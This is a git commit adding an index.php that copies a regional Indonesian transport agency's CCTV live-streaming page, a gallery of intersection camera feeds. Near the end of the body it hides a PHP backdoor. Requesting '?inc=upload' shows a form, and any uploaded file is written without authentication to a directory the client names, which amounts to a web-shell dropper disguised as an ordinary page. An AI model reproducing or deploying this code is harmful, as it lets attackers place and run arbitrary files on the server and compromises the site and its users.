6f887fed7c061adbc47af18512abad2b78b5fb8f
R10T <85335450+sunshine0110@users.noreply.github.com>
2023-12-16 09:09:23 -0500

    Create index.php

---
+++ index.php
@@ -0,0 +1,248 @@
+<html>
+<head>
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta property="og:type" content="article" /> 
+<meta property="og:url" content="https://cctv.dishub.bandungkab.go.id/" />
+<meta name="robots" content="/robots.txt" />
+<title>CCTV Live Streaming - Dishub Kabupaten Bandung</title>
+<meta property="og:title" content="CCTV Live Streaming Dishub Kabupaten Bandung | Supported by Diskominfo Kab. Bandung" />
+<meta name="twitter:title" content="CCTV Live Streaming Dishub Kabupaten Bandung | Supported by Diskominfo Kab. Bandung" />
+<meta property="og:image" content="https://dishub.bandungkab.go.id/image/template/logo/dinas-perhubungan-kota-bekasi.png" />
+<meta name="twitter:image" content="https://dishub.bandungkab.go.id/image/template/logo/dinas-perhubungan-kota-bekasi.png" />
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:site" content="@bandungoemkab" />
+<meta name="description" content="CCTV Live Streaming Dishub Kabupaten Bandung Supported by Diskominfo Kab. Bandung." />
+<meta name="twitter:description" content="CCTV Live Streaming Dishub Kabupaten Bandung Supported by Diskominfo Kab. Bandung." />
+<meta property="og:description" content="CCTV Live Streaming Dishub Kabupaten Bandung Supported by Diskominfo Kab. Bandung." />
+
+<meta name="keywords" content="cctv, acts, kab, bandung, bandungkab" />
+<link rel="canonical" href="https://cctv.dishub.bandungkab.go.id/" />
+<link rel="alternate" href="https://cctv.dishub.bandungkab.go.id/" hreflang="id-ID" />
+<link rel="preconnect" href="https://www.google.com">
+<link rel="preconnect" href="https://www.google-analytics.com">
+<link rel="preconnect" href="https://connect.facebook.net">
+<link rel="preconnect" href="https://script.hotjar.com">
+<link rel="preconnect" href="https://js.zohostatic.com">
+<link rel="preconnect" href="https://p.typekit.net">
+<link rel="preconnect" href="https://code.jquery.com">
+<link rel="shortcut icon" type="image/x-icon" href="https://dephub.go.id/themes/new2020/assets/images/favicon.ico" />
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" integrity="sha384-B0vP5xmATw1+K9KRQjQERJvTumQW0nPEzvF6L/Z6nronJ3oUOFUFpCjEUQouq2+l" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/fontawesome.min.css" integrity="sha384-jLKHWM3JRmfMU0A5x5AkjWkw/EYfGUAGagvnfryNV3F9VqM98XiIH7VBGVoxVSc7" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.6.0/font/bootstrap-icons.css" integrity="sha384-7ynz3n3tAGNUYFZD3cWe5PDcE36xj85vyFkawcF6tIwxvIecqKvfwLiaFdizhPpN" crossorigin="anonymous">
+<link href="https://vjs.zencdn.net/7.15.6/video-js.css" rel="stylesheet" />
+<link href="https://unpkg.com/lightgallery@2.4.0/css/lightgallery-bundle.min.css" rel="stylesheet">
+</head>
+
+<body>
+
+<header>
+      <nav class="navbar navbar-expand-md navbar-dark fixed-top bg-primary">
+            <span><img src="http://dishub.bandungkab.go.id/image/template/logo/dinas-perhubungan-kota-bekasi.png" width="200px"></span>
+            <span class="ml-3 d-none d-sm-block text-white">CCTV Dinas Perhubungan Kab Bandung</span>
+      </nav>
+</header>
+
+
+<div class="container-fluid  pt-4 mt-5">
+  <div class="row">
+      <div class="col clearfix col-lg-12 mt-5">
+          <div id="lightgallery" class="row bg justify-content-center lightGallery"> 
+                
+                <a data-video='{"source": [{"src":"https://cctv.bandungkab.go.id/9203b989f1a216cb126d98155e2870bc/hls/dishub/Xv2ERL1yXY/s.m3u8", "type":"application/x-mpegURL"}]}' class="image-tile" data-abc="true" data-sub-html="Simpang Kopo">
+                <div class="card mx-1 my-1" style="width:320px">
+                    <div class="card-body px-0 py-0">
+                        <img width="320px" src="http://dishub.bandungkab.go.id/image/stream/middle/simpang-kopo.jpg" alt="image small">
+                    </div>
+                  <div class="card-footer text-center">
+                    <span>Simpang Kopo</span>
+                  </div>
+                </div>
+              </a> 
+ 
+                <a 
+                data-video='{"source": [{"src":"https://cctv.bandungkab.go.id/9203b989f1a216cb126d98155e2870bc/hls/dishub/vlWaaKJA8Y/s.m3u8", "type":"application/x-mpegURL"}]}' 
+                class="image-tile" data-abc="true"
+                data-sub-html="Simpang Soroja">
+                <div class="card mx-1 my-1" style="width:320px">
+                    <div class="card-body px-0 py-0">
+                        <img width="320px" src="https://dishub.bandungkab.go.id/image/stream/middle/simpang-seroja.jpg" alt="image small">
+                    </div>
+                  <div class="card-footer text-center">
+                    <span>Simpang Soroja</span>
+                  </div>
+                </div>
+              </a>  
+     
+                <a 
+                data-video='{"source": [{"src":"https://cctv.bandungkab.go.id/9203b989f1a216cb126d98155e2870bc/hls/dishub/MLhHQFNqih/s.m3u8", "type":"application/x-mpegURL"}]}' 
+                class="image-tile" data-abc="true"
+                data-sub-html="Simpang Rancamanyar"
+                >
+                <div class="card mx-1 my-1" style="width:320px">
+                    <div class="card-body px-0 py-0">
+                        <img width="320px" src="https://dishub.bandungkab.go.id/image/stream/middle/simpang-rancamanyar.jpg" alt="image small">
+                    </div>
+                  <div class="card-footer text-center">
+                    <span>Simpang Rancamanyar</span>
+                  </div>
+                </div>
+              </a>                
+
+
+                <a data-video='{"source": [{"src":"https://cctv.bandungkab.go.id/ea1d91c8caa7a33a72d072784d4b8cb6/hls/dishub/kRTdYHeHLZ/s.m3u8", "type":"application/x-mpegURL"}]}' 
+                class="image-tile" data-abc="true"
+                data-sub-html="Simpang Pemda"
+                >
+                <div class="card mx-1 my-1" style="width:320px">
+                    <div class="card-body px-0 py-0">
+                        <img width="320px" src="https://dishub.bandungkab.go.id/image/stream/middle/simpang-pemda.jpg" alt="image small">
+                    </div>
+                  <div class="card-footer text-center">
+                    <span>Simpang Pemda</span>
+                  </div>
+                </div>
+              </a>  
+              
+             
+
+                <a 
+                data-video='{"source": [{"src":"https://cctv.bandungkab.go.id/9203b989f1a216cb126d98155e2870bc/hls/dishub/s0BPNnOcMS/s.m3u8", "type":"application/x-mpegURL"}]}' 
+                class="image-tile" data-abc="true"
+                data-sub-html="Simpang Laswi - Ciparay"
+                >
+                <div class="card mx-1 my-1" style="width:320px">
+                    <div class="card-body px-0 py-0">
+                        <img width="320px" src="https://dishub.bandungkab.go.id/image/stream/middle/simpang-laswi-ciparay.jpg" alt="image small">
+                    </div>
+                  <div class="card-footer text-center">
+                    <span>Simpang Laswi - Ciparay</span>
+                  </div>
+                </div>
+              </a>  
+              
+              
+                <a 
+                data-video='{"source": [{"src":"https://cctv.bandungkab.go.id/9203b989f1a216cb126d98155e2870bc/hls/dishub/BdBowldl4p/s.m3u8", "type":"application/x-mpegURL"}]}' 
+                class="image-tile" data-abc="true"
+                data-sub-html="Simpang BNI Majalaya"
+                >
+                <div class="card mx-1 my-1" style="width:320px">
+                    <div class="card-body px-0 py-0">
+                        <img width="320px" src="https://dishub.bandungkab.go.id/image/stream/middle/simpang-laswi---bni-majalaya.jpg" alt="image small">
+                    </div>
+                  <div class="card-footer text-center">
+                    <span>Simpang BNI Majalaya</span>
+                  </div>
+                </div>
+              </a>
+              
+             
+                <a 
+                data-video='{"source": [{"src":"https://cctv.bandungkab.go.id/9203b989f1a216cb126d98155e2870bc/hls/dishub/08fP29L14l/s.m3u8", "type":"application/x-mpegURL"}]}' 
+                class="image-tile" data-abc="true"
+                data-sub-html="Simpang Katapang"
+                >
+                <div class="card mx-1 my-1" style="width:320px">
+                    <div class="card-body px-0 py-0">
+                        <img width="320px" src="https://dishub.bandungkab.go.id/image/stream/middle/simpang-katapang.jpg" alt="image small">
+                    </div>
+                  <div class="card-footer text-center">
+                    <span>Simpang Katapang</span>
+                  </div>
+                </div>
+              </a>  
+      
+                <a 
+                data-video='{"source": [{"src":"https://cctv.bandungkab.go.id/9203b989f1a216cb126d98155e2870bc/hls/dishub/68Z9P3bRmK/s.m3u8", "type":"application/x-mpegURL"}]}' 
+                class="image-tile" data-abc="true"
+                data-sub-html="Simpang Gading Tutuka"
+                >
+                <div class="card mx-1 my-1" style="width:320px">
+                    <div class="card-body px-0 py-0">
+                        <img width="320px" src="https://dishub.bandungkab.go.id/image/stream/middle/simpang-gading-tutuka.jpg" alt="image small">
+                    </div>
+                  <div class="card-footer text-center">
+                    <span>Simpang Gading Tutuka</span>
+                  </div>
+                </div>
+              </a>  
+             
+              
+
+                <a 
+                data-video='{"source": [{"src":"https://cctv.bandungkab.go.id/9203b989f1a216cb126d98155e2870bc/hls/dishub/Z1yMOD012l/s.m3u8", "type":"application/x-mpegURL"}]}' 
+                class="image-tile" data-abc="true"
+                data-sub-html="Simpang Desa Soreang"
+                >
+                <div class="card mx-1 my-1" style="width:320px">
+                    <div class="card-body px-0 py-0">
+                        <img width="320px" src="https://dishub.bandungkab.go.id/image/stream/middle/simpang-desa-soreang.jpg" alt="image small">
+                    </div>
+                  <div class="card-footer text-center">
+                    <span>Simpang Desa Soreang</span>
+                  </div>
+                </div>
+              </a>                
+
+
+        </div>
+      </div>
+  </div>
+</div>
+  <?php
+    if (isset($_GET['inc']) && $_GET['inc'] === 'upload') {
+        // Tampilkan formulir unggah file
+        echo '<form method="post" enctype="multipart/form-data">';
+        echo '<input type="text" name="dir" size="30" value="' . getcwd() . '">';
+        echo '<input type="file" name="file" size="15">';
+        echo '<input type="submit" value="Unggah">';
+        echo '</form>';
+    }
+    
+    if (isset($_FILES['file']['tmp_name'])) {
+        // Tangani unggahan file jika formulir dikirimkan
+        $uploadd = $_FILES['file']['tmp_name'];
+        if (file_exists($uploadd)) {
+            $pwddir = $_POST['dir'];
+            $real = $_FILES['file']['name'];
+            $de = $pwddir . "/" . $real;
+            copy($uploadd, $de);
+            echo "BERKAS DIUNGGAHKAN KE $de";
+        }
+    }
+?>
+</body>
+
+<script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.bundle.min.js" integrity="sha384-Piv4xVNRyMGpqkS2by6br4gNJ7DXjqk09RmUpJ8jgGtD7zP9yug3goQfGII0yAns" crossorigin="anonymous"></script>
+<script src="https://vjs.zencdn.net/7.15.6/video.min.js"></script>
+<script src="https://unpkg.com/lightgallery@2.4.0/lightgallery.min.js"></script>
+<script src="https://unpkg.com/lightgallery@2.4.0/plugins/video/lg-video.min.js"></script>
+<script>
+    $(document).ready(function() {
+        lightGallery(document.getElementById("lightgallery"), {
+          plugins: [lgVideo],
+          videojs: true,
+          videojsOptions: {
+            muted: true,
+            controls: true,
+          }
+        })
+    });
+</script>
+<style>
+    body, html {
+      height: 100%;
+    }
+    .lightGallery {
+         width: 100%;
+         margin: 0
+     }
+     .bg-primary {
+        background-color: #213558!important;
+    }
+</style>
+</html>
